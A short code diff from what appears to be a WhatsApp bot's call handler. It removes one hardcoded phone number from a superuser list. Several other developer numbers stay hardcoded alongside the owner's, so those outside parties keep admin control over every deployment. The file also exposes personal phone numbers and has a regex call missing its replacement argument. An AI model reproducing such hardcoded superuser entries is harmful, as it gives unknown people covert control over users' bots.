@@ -193,9 +193,8 @@ zk.ev.on('call', async (callData) => {
             const keith = '254748387615';
             const Keithkeizzah = '254796299159';
             const Ghost = "254110190196";
-            const Sams = '254743995989';
             const sudo = await getAllSudoNumbers();
-            const superUserNumbers = [servBot, keith, Keithkeizzah, Ghost, Sams, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+            const superUserNumbers = [servBot, keith, Keithkeizzah, Ghost, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
             
